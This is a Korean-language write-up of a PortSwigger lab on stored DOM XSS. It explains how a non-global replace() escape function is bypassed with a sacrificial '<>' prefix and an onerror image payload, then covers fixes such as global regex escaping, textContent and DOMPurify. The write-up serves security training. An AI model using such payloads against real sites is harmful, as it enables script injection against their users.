# Lab: Stored DOM XSS

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — Stored DOM XSS / `replace()` 비전역 플래그 우회 / `innerHTML` sink
- **링크**: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored

## 목표

댓글 기능에서 클라이언트 JS의 불완전한 이스케이프 처리를 우회하여 `alert()` 를 실행시킨다.

## 취약점 분석

### 서버 측

댓글 데이터를 DB에 저장하고, 요청 시 JSON으로 반환한다.  
서버 자체는 별도 이스케이프 없이 저장된 데이터를 그대로 응답한다.

### 클라이언트 측

페이지 JS가 JSON 데이터를 받아 `innerHTML` 로 댓글을 렌더링한다.  
이때 `<>` 를 HTML 엔티티로 치환하는 이스케이프 함수를 사용한다.

```javascript
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}

// 댓글 렌더링
commentDiv.innerHTML = escapeHTML(comment.body);
```

## 취약점 핵심 — `replace()` 의 비전역(non-global) 플래그

JavaScript의 `String.replace(pattern, replacement)` 는 기본적으로 **첫 번째 일치항목만** 치환한다.

```javascript
// g 플래그 없음 — 첫 번째만 치환
'<a><b>'.replace('<', '&lt;')   // '&lt;a><b>'  (두 번째 < 는 그대로)

// g 플래그 있음 — 전체 치환
'<a><b>'.replace(/</g, '&lt;')  // '&lt;a>&lt;b>'
```

`escapeHTML` 함수에서:
- `.replace('<', '&lt;')` — 첫 번째 `<` 만 치환
- `.replace('>', '&gt;')` — 첫 번째 `>` 만 치환

## 공격 방법 — `<>` 를 희생 토큰으로 사용

```
댓글 입력: <><img src=1 onerror=alert(1)>
```

`escapeHTML()` 처리 흐름:

```
입력:                <  >  <img src=1 onerror=alert(1)>
                     ↓
1단계 replace('<'):  &lt;  >  <img src=1 onerror=alert(1)>
     ↑ 첫 번째 < 만 치환됨

2단계 replace('>'):  &lt;  &gt;  <img src=1 onerror=alert(1)>
     ↑ 첫 번째 > 만 치환됨

결과: &lt;&gt;<img src=1 onerror=alert(1)>
```

`innerHTML` 에 삽입되는 최종 HTML:

```html
&lt;&gt;<img src=1 onerror=alert(1)>
```

- `&lt;&gt;` — `<>` 로 렌더링되는 텍스트 (무해)
- `<img src=1 onerror=alert(1)>` — **이스케이프되지 않고 그대로 삽입됨**
- 이미지 로드 실패 → `onerror` 발화 → `alert(1)` 실행

## 002 (Stored XSS) vs 013 (Stored DOM XSS) 비교

| 항목 | 002 Stored XSS | 013 Stored DOM XSS |
|------|----------------|-------------------|
| 저장 위치 | DB | DB |
| 취약한 처리 위치 | **서버** (HTML 출력 시 인코딩 없음) | **클라이언트 JS** (불완전한 이스케이프) |
| 실행 경로 | 서버 → HTML 응답 → 브라우저 렌더링 | 서버 → JSON → 클라이언트 JS → `innerHTML` |
| WAF 탐지 난이도 | 낮음 (HTML에 페이로드 직접 노출) | 높음 (JSON 데이터로 전달, JS가 처리) |
| 방어 위치 | 서버 출력 인코딩 | 클라이언트 JS 이스케이프 + `textContent` 사용 |

---

## `replace()` 비전역 플래그 우회 패턴

`replace()` 의 첫 번째 인자가 정규식이 아닌 **문자열**이면 항상 첫 번째만 치환된다.

```javascript
// 문자열 인자 — 첫 번째만
'aaa'.replace('a', 'b')     // 'baa'

// 정규식 g 플래그 — 전체
'aaa'.replace(/a/g, 'b')    // 'bbb'

// 정규식 없이 — 첫 번째만 (문자열과 동일)
'aaa'.replace(/a/, 'b')     // 'baa'
```

### 우회 전략

이스케이프 함수가 첫 번째 `<` 와 `>` 만 치환한다면:

```
페이로드 구조: [희생 토큰] + [실제 페이로드]

희생 토큰: <>  (첫 번째 < 와 > 를 이스케이프에 소모시킴)
실제 페이로드: <img src=1 onerror=alert(1)>  (이스케이프 통과)
```

희생 토큰의 수는 `replace()` 호출 횟수만큼 늘려야 한다.

```javascript
// replace 가 2번 호출될 때
// → 희생 토큰 2개 필요
'<<>><img src=1 onerror=alert(1)>'
//  ↑↑↑↑ 2개의 < 와 > 를 소모
//         ↑ 실제 페이로드 통과

// replace('<',...) 1회, replace('>',...) 1회 → 각 1개만 소모
// 따라서 <> 하나면 충분
```

## 핵심 정리

- `String.replace(string, ...)` 는 첫 번째 일치만 치환한다 — 전체 치환은 정규식 + `g` 플래그 필요.
- 불완전한 이스케이프는 우회 가능하다 — 첫 번째 `<>` 를 이스케이프에 소모시키고 실제 페이로드를 통과시킨다.
- Stored DOM XSS는 서버가 아닌 클라이언트 JS에서 취약점이 발생하므로 서버 측 방어만으로는 막을 수 없다.
- **방어**:
  - `replace(/</g, '&lt;').replace(/>/g, '&gt;')` — 정규식 `g` 플래그로 전체 치환
  - 또는 `innerHTML` 대신 `textContent` 사용 (HTML로 해석하지 않음)
  - 가장 확실한 방법: DOMPurify 라이브러리로 정제 후 `innerHTML`

## 배운 점 및 추가 학습

### 1. 이스케이프 함수의 흔한 실수들

```javascript
// 실수 1 — g 플래그 없음
html.replace('<', '&lt;')          // 첫 번째만 치환

// 실수 2 — 순서 오류 (& 를 마지막에 치환하면 이미 인코딩된 & 를 재인코딩)
html.replace('<', '&lt;')
    .replace('&', '&amp;')         // &lt; 의 & 도 다시 치환됨 → &amp;lt;

// 실수 3 — 일부 문자만 처리
html.replace(/</g, '&lt;')         // > 는 처리 안 함

// 올바른 순서
html.replace(/&/g, '&amp;')        // & 를 먼저
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
```

### 2. `innerHTML` vs `textContent` vs `innerText`

| 속성 | HTML 해석 | XSS 위험 | 사용 권고 |
|------|-----------|---------|-----------|
| `innerHTML` | O | **있음** | 사용자 입력에 사용 금지 |
| `outerHTML` | O | **있음** | 사용자 입력에 사용 금지 |
| `textContent` | X (텍스트로만 삽입) | **없음** | 텍스트 삽입 시 권장 |
| `innerText` | X | **없음** | `textContent` 와 유사 (렌더링 고려) |

```javascript
// 위험
element.innerHTML = userComment;

// 안전 — HTML로 해석되지 않고 텍스트로만 표시
element.textContent = userComment;
// <img src=1 onerror=alert(1)> → 그대로 텍스트로 표시됨
```

